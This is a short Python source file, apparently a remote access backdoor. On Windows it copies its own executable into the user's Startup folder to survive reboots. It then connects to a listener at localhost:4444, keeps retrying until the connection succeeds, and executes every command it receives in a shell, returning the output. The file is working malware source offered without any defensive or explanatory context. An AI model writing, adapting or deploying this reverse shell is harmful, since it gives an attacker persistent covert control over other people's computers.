import socket
import subprocess
import os
import shutil
import sys


class Client:
    def __init__(self, host, port):
        if hasattr(sys, "_MEIPASS"):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)

        if os.name == "nt":
            appdata = os.getenv("APPDATA")

            path = os.path.join(
                appdata,
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
                os.path.basename(exe_path),
            )

            if not os.path.exists(path):
                shutil.copyfile(exe_path, path)

        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))

    def send(self: isinstance, data: bytes):
        self.client.send(data)

    def receive(self):
        return self.client.recv(6000)


client = None


def connect():
    global client
    while client is None:
        try:
            client = Client("localhost", 4444)
        except Exception:
            pass


connect()

while True:
    try:

        command = client.receive().decode()

        if command is None:
            continue

        output = subprocess.run(
            command,
            shell=True,
            text=True,
            capture_output=True,
        )
        output = output.stderr if output.stderr else output.stdout

        if output is None or output == "":
            output = "Command executed successfully"

        client.send(output.encode())
    except Exception:
        client = None
        connect()
